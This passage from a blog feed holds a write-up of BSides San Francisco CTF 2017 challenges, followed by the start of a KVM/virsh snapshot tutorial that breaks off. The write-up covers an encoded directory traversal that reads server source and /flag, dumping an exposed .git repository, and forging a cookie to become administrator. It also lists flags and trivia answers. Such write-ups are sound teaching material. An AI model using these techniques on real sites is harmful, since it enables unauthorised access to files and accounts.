<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : BSides San Francisco CTF 2017</li>
<li><strong>Website</strong> : <a href="https://scoreboard.ctf.bsidessf.com/" target="_blank" rel="external">ctf.bsidessf.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/414" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="1-hackers-misc">1 - Hackers - Misc</h2>
<blockquote>
<p>Hack the __!</p>
</blockquote>
<p>Answer: <code>planet</code></p>
<h2 id="20-nop-misc">20 - NOP - Misc</h2>
<blockquote>
<p>x86's NOP is actually another instruction. What is the Intel syntax representation of the assembly of the other instruction?</p>
<p>Include a space between operands, if applicable.</p>
</blockquote>
<p>Answer: <code>xchg eax, eax</code></p>
<p><a href="https://en.wikipedia.org/wiki/NOP" target="_blank" rel="external">Details</a></p>
<h1 id="1-ancient-hop-grain-juice-misc">1 - Ancient Hop Grain Juice - Misc</h1>
<blockquote>
<p>This beverage, brewed since ancient times, is made from hops and grains?</p>
</blockquote>
<p>Answer: <code>beer</code></p>
<h1 id="1-the-wrong-cipher-misc">1 - The Wrong Cipher - Misc</h1>
<blockquote>
<p>This cipher was used incorrectly in WEP</p>
</blockquote>
<p>Answer: <code>RC4</code></p>
<p><a href="https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy" target="_blank" rel="external">Details</a></p>
<h1 id="1-the-right-cipher-misc">1 - The Right Cipher - Misc</h1>
<blockquote>
<p>This cipher was correctly used in TKIP</p>
</blockquote>
<p>Answer: <code>RC4</code></p>
<p><a href="https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol" target="_blank" rel="external">Details</a></p>
<h1 id="1-let-s-play-a-game-misc">1 - Let's play a game - Misc</h1>
<blockquote>
<p>This is the name of the game that a young hacker thinks he's playing with the WOPR Supercomputer. [Spaces expected]</p>
</blockquote>
<p>Answer: <code>Global Thermonuclear War</code></p>
<p><a href="https://en.wikipedia.org/wiki/WarGames" target="_blank" rel="external">Details</a></p>
<h1 id="1-quote-misc">1 - Quote - Misc</h1>
<blockquote>
<p>This movie featured the memorable phrase &quot;My voice is my passport&quot;</p>
</blockquote>
<p>Answer: <code>Sneakers</code></p>
<p><a href="http://www.imdb.com/title/tt0105435/quotes" target="_blank" rel="external">Movie</a></p>
<h1 id="20-zumbo-1-web">20 - Zumbo 1 - Web</h1>
<blockquote>
<p>Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.</p>
<p>Three flags await. Can you find them?</p>
<p><a href="http://zumbo-8ac445b1.ctf.bsidessf.net" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net</a></p>
<p>Stages 2 and 3 - coming soon!</p>
</blockquote>
<p>View source of <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/index.template" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/index.template</a></p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- page: index.template, src: /code/server.py --&gt;</span></div></pre></td></tr></table></figure></p>
<p>Let's check the <code>/code/server.py</code> path: <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/code/server.py" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/code/server.py</a>. We get an error:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[Errno 2] No such file or directory: u&apos;code/server.py&apos;</div><div class="line">&lt;!-- page: code/server.py, src: /code/server.py --&gt;</div></pre></td></tr></table></figure></p>
<p>Every non-existing page give the same error. We need to do a directory traversal: <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/../../../../code/server.py" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/../../../../code/server.py</a>. But unfortunately the <code>../../../../</code> part is automatically removed.</p>
<p>So I just URLencoded this part to bypass the filter: <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/..%2F..%2F..%2F..%2Fcode/server.py</a>.</p>
<p>And we get the <code>server.py</code> source:</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">import flask, sys, os</div><div class="line">import requests</div><div class="line"></div><div class="line">app = flask.Flask(__name__)</div><div class="line">counter = 12345672</div><div class="line"></div><div class="line"></div><div class="line">@app.route('/&lt;path:page&gt;')</div><div class="line">def custom_page(page):</div><div class="line">    if page == 'favicon.ico': return ''</div><div class="line">    global counter</div><div class="line">    counter += 1</div><div class="line">    try:</div><div class="line">        template = open(page).read()</div><div class="line">    except Exception as e:</div><div class="line">        template = str(e)</div><div class="line">    template += "\n&lt;!-- page: %s, src: %s --&gt;\n" % (page, __file__)</div><div class="line">    return flask.render_template_string(template, name='test', counter=counter);</div><div class="line"></div><div class="line">@app.route('/')</div><div class="line">def home():</div><div class="line">    return flask.redirect('/index.template');</div><div class="line"></div><div class="line">if __name__ == '__main__':</div><div class="line">    flag1 = 'FLAG: FIRST_FLAG_WASNT_HARD'</div><div class="line">    with open('/flag') as f:</div><div class="line">            flag2 = f.read()</div><div class="line">    flag3 = requests.get('http://vault:8080/flag').text</div><div class="line"></div><div class="line">    print "Ready set go!"</div><div class="line">    sys.stdout.flush()</div><div class="line">    app.run(host="0.0.0.0")</div><div class="line"></div><div class="line">&lt;!-- page: ../../../../code/server.py, src: /code/server.py --&gt;</div></pre></td></tr></table></figure></p>
<p>Flag was <code>FLAG: FIRST_FLAG_WASNT_HARD</code>.</p>
<p><strong>PS</strong>: Only <code>page</code> is used so <code>http://zumbo-8ac445b1.ctf.bsidessf.net/server.py</code> also works...</p>
<h1 id="100-zumbo-2-web">100 - Zumbo 2 - Web</h1>
<blockquote>
<p>Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.</p>
<p>Three flags await. Can you find them?</p>
<p><a href="http://zumbo-8ac445b1.ctf.bsidessf.net" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net</a></p>
<p>Stage 3 - coming soon!</p>
</blockquote>
<p>For the next part of the challenge, we already got the <code>server.py</code> source so I looked again at the flag2 part:</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'/flag'</span>) <span class="keyword">as</span> f:</div><div class="line">        flag2 = f.read()</div></pre></td></tr></table></figure></p>
<p>Ok the flag is in <code>/flag</code> so just change <code>http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py</code> into <code>http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fflag</code>.</p>
<p>And get the flag: <code>FLAG: RUNNER_ON_SECOND_BASE</code>.</p>
<h1 id="100-the-year-2000-web">100 - the-year-2000 - Web</h1>
<blockquote>
<p>Wait, what year is it?</p>
<p><a href="http://theyear2000.ctf.bsidessf.net/" target="_blank" rel="external">http://theyear2000.ctf.bsidessf.net/</a></p>
</blockquote>
<p>The author says on this home page:</p>
<blockquote>
<p>I made this website all by myself using these tools</p>
<ul>
<li>html</li>
<li>notepad++</li>
<li>git</li>
<li>apache</li>
</ul>
</blockquote>
<p>I tried <code>http://theyear2000.ctf.bsidessf.net/.git/</code> and it returned me <em>Forbidden</em> error. So there is a <code>.git</code> repot here.</p>
<p>As usual I used <a href="https://github.com/internetwache/GitTools" target="_blank" rel="external">GitTools</a> to dump the repository:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$ ./gitdumper.sh http://theyear2000.ctf.bsidessf.net/.git/ repo</div><div class="line">Destination folder does not exist</div><div class="line">Creating repo/.git/</div><div class="line">Downloaded: HEAD</div><div class="line">Downloaded: objects/info/packs</div><div class="line">Downloaded: description</div><div class="line">Downloaded: config</div><div class="line">Downloaded: COMMIT_EDITMSG</div><div class="line">Downloaded: index</div><div class="line">Downloaded: packed-refs</div><div class="line">Downloaded: refs/heads/master</div><div class="line">Downloaded: refs/remotes/origin/HEAD</div><div class="line">Downloaded: refs/stash</div><div class="line">Downloaded: logs/HEAD</div><div class="line">Downloaded: logs/refs/heads/master</div><div class="line">Downloaded: logs/refs/remotes/origin/HEAD</div><div class="line">Downloaded: info/refs</div><div class="line">Downloaded: info/exclude</div><div class="line">Downloaded: objects/4e/ec6b9c6e464c35fff1efb8444dd0ac1ae67b30</div><div class="line">Downloaded: objects/00/00000000000000000000000000000000000000</div><div class="line">Downloaded: objects/e0/39a6684f53e818926d3f62efd25217b25fc97e</div><div class="line">Downloaded: objects/9e/9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0</div><div class="line">Downloaded: objects/f3/a3f88425975542bb0058651867f8090fed250f</div><div class="line">Downloaded: objects/0c/e1cbf654058dd4b9ba0df440a02aef408f76da</div><div class="line">Downloaded: objects/bd/72ee2c7c5adb017076fd47a92858cef2a04c11</div><div class="line">Downloaded: objects/e1/6b652d659d50fc5e7aecae789e743c0a8fa035</div><div class="line">Downloaded: objects/7c/57d178eea98e174f3d6ef521126117478085ed</div><div class="line">Downloaded: objects/7b/aff32394e517c44f35b75079a9496559c88053</div></pre></td></tr></table></figure></p>
<p>A quick <code>git log -p</code> show me this commit:</p>
<p><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">commit 4eec6b9c6e464c35fff1efb8444dd0ac1ae67b30</div><div class="line">Author: Mark Zuckerberg &lt;thezuck@therealzuck.zuck&gt;</div><div class="line">Date:   Sat Feb 11 22:54:32 2017 +0000</div><div class="line"></div><div class="line">    Wooops, didn't want to commit that. Rebased.</div><div class="line"></div><div class="line">diff --git a/index.html b/index.html</div><div class="line">index 7c57d17..e16b652 100644</div><div class="line"><span class="comment">--- a/index.html</span></div><div class="line"><span class="comment">+++ b/index.html</span></div><div class="line">@@ -15,7 +15,7 @@ pre &#123;</div><div class="line"> &lt;/style&gt;</div><div class="line"> &lt;/head&gt;</div><div class="line"> &lt;body&gt;</div><div class="line"><span class="deletion">-&lt;h1&gt;Welcome to my homepage!!!!&lt;/h1&gt;</span></div><div class="line"><span class="addition">+&lt;h1&gt;Welcome to my homepage, there are no flags here.!!!!&lt;/h1&gt;</span></div><div class="line"> &lt;hr&gt;</div><div class="line"> &lt;p&gt;I made this website all by myself using these tools</div><div class="line"> &lt;ul&gt;</div></pre></td></tr></table></figure></p>
<p>There was a rebase so let's see when it happened:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ git reflog</div><div class="line">4eec6b9 HEAD@&#123;0&#125;: commit: Wooops, didn&apos;t want to commit that. Rebased.</div><div class="line">e039a66 HEAD@&#123;1&#125;: reset: moving to HEAD~1</div><div class="line">9e9ce4d HEAD@&#123;2&#125;: commit: Fixed a spelling error</div><div class="line">e039a66 HEAD@&#123;3&#125;: commit (initial): First commit on my website</div></pre></td></tr></table></figure></p>
<p>Ok so we have to come back before the HEAD reset:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git reset --hard HEAD@&#123;2&#125;</div><div class="line">HEAD is now at 9e9ce4d Fixed a spelling error</div></pre></td></tr></table></figure></p>
<p>Now let's take a look at this fix: <code>git log -p -1</code></p>
<p><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">commit 9e9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0</div><div class="line">Author: Mark Zuckerberg &lt;thezuck@therealzuck.zuck&gt;</div><div class="line">Date:   Sat Feb 11 22:54:27 2017 +0000</div><div class="line"></div><div class="line">    Fixed a spelling error</div><div class="line"></div><div class="line">diff --git a/index.html b/index.html</div><div class="line">index 7c57d17..7baff32 100644</div><div class="line"><span class="comment">--- a/index.html</span></div><div class="line"><span class="comment">+++ b/index.html</span></div><div class="line">@@ -43,3 +43,4 @@ ______________________</div><div class="line"> &lt;/pre&gt;</div><div class="line"> &lt;/marquee&gt;</div><div class="line"> &lt;/body&gt;&lt;/html&gt;</div><div class="line"><span class="addition">+Your flag is... FLAG:what_is_HEAD_may_never_die</span></div></pre></td></tr></table></figure></p>
<p>Here is teh flag: <code>FLAG:what_is_HEAD_may_never_die</code>.</p>
<h1 id="40-easycap-forensics">40 - easycap - Forensics</h1>
<blockquote>
<p>Can you get the flag from the packet capture?</p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/5e1cb4ad2dd6aef750654f5377d9e67ed2732b97fe64d56e0603242c4b87d921" target="_blank" rel="external">easycap.pcap</a></li>
</ul>
</blockquote>
<p>This is some raw tcp frames and some of them have 1 byte of additional data.</p>
<p>Let's extract that with <em>tshark</em>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ tshark -r easycap.pcap -T fields -e data | tr -d &apos;\n&apos;</div><div class="line">464c41473a33383562383761666338363731646565303735353032393064313661383037310a%</div></pre></td></tr></table></figure></p>
<p>Now translate hex to ASCII with a little ruby trick:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):008:0&gt;</span> [<span class="string">'464c41473a33383562383761666338363731646565303735353032393064313661383037310a'</span>].pack(<span class="string">'H*'</span>)</div><div class="line">=&gt; <span class="string">"FLAG:385b87afc8671dee07550290d16a8071\n"</span></div></pre></td></tr></table></figure></p>
<p>Flag is <code>FLAG:385b87afc8671dee07550290d16a8071</code>.</p>
<h1 id="10-easy-reversing">10 - Easy - Reversing</h1>
<blockquote>
<p>This one is easy.</p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/ee2246fd415195570644107a359662e536f87c438c00a65d54b165d5534bd971" target="_blank" rel="external">easy-32</a></li>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/4d761392565db05fde85a2d5d4f254954a989a2ac39acf0357dba45bd70a4db0" target="_blank" rel="external">easy-64</a></li>
</ul>
</blockquote>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ strings easy-64 | grep -i flag</div><div class="line">FLAG:db2f62a36a018bce28e46d976e3f9864</div></pre></td></tr></table></figure></p>
<h1 id="30-easyauth-web">30 - easyauth - Web</h1>
<blockquote>
<p>Can you gain admin access to this site?</p>
<p><a href="http://easyauth-afee0e67.ctf.bsidessf.net" target="_blank" rel="external">http://easyauth-afee0e67.ctf.bsidessf.net</a></p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/cdbec071e3710a8465030f032d44e72ab2449098c9ad6597256087751d19bb39" target="_blank" rel="external">easyauth.php</a></li>
</ul>
</blockquote>
<p>Hint say to log in with: guest/guest</p>
<p>We have a cookie like this:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth=username=guest&amp;date=2017-02-13T21:09:45+0000&amp;</div></pre></td></tr></table></figure></p>
<p>If we click on the link we get the following message:</p>
<blockquote>
<p>It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(</p>
</blockquote>
<p>Configure proxy and launch burpsuite.</p>
<p>Then change <code>guest</code> into <code>administrator</code> in the cookie and send. You now get the flag:</p>
<blockquote>
<p>Congratulations, you're the administrator! Here's your reward:</p>
<p>FLAG:0076ecde2daae415d7e5ccc7db909e7e</p>
</blockquote>
<h1 id="450-vhash-crypto">450 - vhash - Crypto</h1>
<blockquote>
<p>---- Due to a bug, the challenge might be easier than intended. Enjoy the free points! ----</p>
<p>Can you gain admin access to this site?</p>
<p>(The vhash binary is what's used for signing the cookie)</p>
<p><a href="http://vhash-c6bb0e85.ctf.bsidessf.net:9292" target="_blank" rel="external">http://vhash-c6bb0e85.ctf.bsidessf.net:9292</a></p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/97a121e61a9dba819eb07de40ddad8ac23c11ee4f92055110a7c6f987c73ed83" target="_blank" rel="external">vhash.zip </a></li>
</ul>
</blockquote>
<p>The zip contain the <code>vhash</code> ELF executable and the <code>index.php</code> source:</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">require_once</span>(<span class="string">'./auth.php'</span>);</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">do_hash</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    $filename = tempnam(sys_get_temp_dir(), <span class="string">'vhash'</span>);</div><div class="line">    file_put_contents($filename, $data);</div><div class="line"></div><div class="line">    $hash = substr(`/home/ctf/vhash $filename`, <span class="number">0</span>, <span class="number">256</span>);</div><div class="line">    unlink($filename);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">create_hmac</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> do_hash(SECRET . $data);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; $_GET[<span class="string">'action'</span>] === <span class="string">'logout'</span>) &#123;</div><div class="line">    setcookie(<span class="string">'auth'</span>, <span class="string">''</span>);</div><div class="line">    header(<span class="string">'Location: index.php'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])) &#123;</div><div class="line">    <span class="comment"># Do pagey stuff</span></div><div class="line">    <span class="keyword">if</span>(is_valid($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">      <span class="comment"># Create the cookie</span></div><div class="line">      $cookie = <span class="string">'username='</span> . $_POST[<span class="string">'username'</span>] . <span class="string">'&amp;'</span>;</div><div class="line">      $cookie .= <span class="string">'date='</span> . date(DATE_ISO8601) . <span class="string">'&amp;'</span>;</div><div class="line">      $cookie .= <span class="string">'secret_length='</span> . strlen(SECRET) . <span class="string">'&amp;'</span>;</div><div class="line"></div><div class="line">      <span class="comment"># Sign the cookie</span></div><div class="line">      $cookie = create_hmac($cookie) . <span class="string">'|'</span> . $cookie;</div><div class="line">      setcookie(<span class="string">'auth'</span>, $cookie);</div><div class="line">      <span class="keyword">print</span> <span class="string">"&lt;h1&gt;Login successful!&lt;/h1&gt;\n"</span>;</div><div class="line">      <span class="keyword">print</span> <span class="string">"&lt;p&gt;Setting cookie: &lt;tt&gt;auth=$cookie&lt;/tt&gt;&lt;/p&gt;\n"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">print</span> <span class="string">"&lt;h1&gt;Username or password was incorrect!&lt;/h1&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Click &lt;a href='index.php'&gt;here&lt;/a&gt; to continue!&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'auth'</span>])) &#123;</div><div class="line">    <span class="keyword">require_once</span>(<span class="string">'./login_form.php'</span>);</div><div class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">list</span>($hmac, $cookie) = explode(<span class="string">'|'</span>, $_COOKIE[<span class="string">'auth'</span>], <span class="number">2</span>);</div><div class="line">  <span class="keyword">if</span>(create_hmac($cookie) !== $hmac) &#123;</div><div class="line">    setcookie(<span class="string">'auth'</span>, <span class="string">''</span>);</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Something was wrong with your auth cookie!&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Click &lt;a href='index.php'&gt;here&lt;/a&gt; to log in again!&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  $pairs = explode(<span class="string">'&amp;'</span>, $cookie);</div><div class="line">  $args = <span class="keyword">array</span>();</div><div class="line">  <span class="keyword">foreach</span>($pairs <span class="keyword">as</span> $pair) &#123;</div><div class="line">    <span class="keyword">if</span>(!strpos($pair, <span class="string">'='</span>))</div><div class="line">      <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">    <span class="keyword">list</span>($name, $value) = explode(<span class="string">'='</span>, $pair, <span class="number">2</span>);</div><div class="line">    $args[$name] = $value;</div><div class="line">  &#125;</div><div class="line">  $username = $args[<span class="string">'username'</span>];</div><div class="line"></div><div class="line">  <span class="keyword">print</span> <span class="string">"&lt;h1&gt;Welcome back, $username!&lt;/h1&gt;\n"</span>;</div><div class="line">  <span class="keyword">if</span>($username == <span class="string">'administrator'</span>) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Congratulations, you're the administrator! Here's your reward:&lt;/p&gt;\n"</span>;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;"</span> . FLAG . <span class="string">"&lt;/p&gt;\n"</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"&lt;p&gt;It's cool that you logged in, but unfortunately we can only give the flag to 'administrator'. :(&lt;/p&gt;\n"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">print</span> <span class="string">"&lt;p&gt;&lt;a href='/index.php?action=logout'&gt;Log out&lt;/a&gt;&lt;/p&gt;\n"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>Description says the challenge is more easy due to a bug, here it is:</p>
<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($username == <span class="string">'administrator'</span>)</div></pre></td></tr></table></figure></p>
<p>So the challenge is exactly like the previous <strong>30 - easyauth - Web</strong>.</p>
<p>Configure proxy and launch burpsuite.</p>
<p>Then change <code>guest</code> into <code>administrator</code> in the cookie and send. You now get the flag:</p>
<blockquote>
<p>Congratulations, you're the administrator! Here's your reward:</p>
<p>FLAG:180e2300112ef5a4f23c93cfdec8d780</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
      <category term="reversing" scheme="http://rawsec.ml/tags/reversing/"/>
    
  </entry>
  
  <entry>
    <title>Snapshot for KVM via libvirt with virsh</title>
    <link href="http://rawsec.ml/en/snapshot-kvm-libvirt-virsh/"/>
    <id>http://rawsec.ml/en/snapshot-kvm-libvirt-virsh/</id>
    <published>2017-02-07T23:00:00.000Z</published>
    <updated>2017-02-07T22:03:01.578Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Libvirt_support.svg/640px-Libvirt_support.svg.png" alt=""></p>
<h2 id="context">Context</h2>
<p>I am using <em>KVM</em>, and use/manage my VMs with <em>virt-manager</em>. But I asked myself this question: how can create or revert some snapshot?</p>
<p>I'm giving examples for qcow2 disk images and commands are made with virsh.</p>
<h2 id="internal-disk-snapshots">Internal Disk Snapshots</h2>
<p>You can list available VM with virsh in order to know their name:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ virsh list</div><div class="line"> Id Name                 State</div><div class="line">----------------------------------</div><div class="line">  1 vmname               running</div></pre></td></tr></table></figure></p>
<p>Then you can check if there already is existing shapshots for this VM:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-list vmname</div><div class="line"> Name                 Creation Time             State</div><div class="line">------------------------------------------------------------</div></pre></td></tr></table></figure></p>
<p>Next there is two possibilities to make a snapshot:</p>
<ul>
<li>create a XML snapshot description file to specify the name and description of the snapshot</li>
<li>or let libvirt choose a name and no description</li>
</ul>
<p>The XML snapshot description file must look like the following:</p>
<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">domainsnapshot</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>vmname-snapshot1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>description of the snapshot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">domainsnapshot</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>Make a snapshot with an XML file:</p>
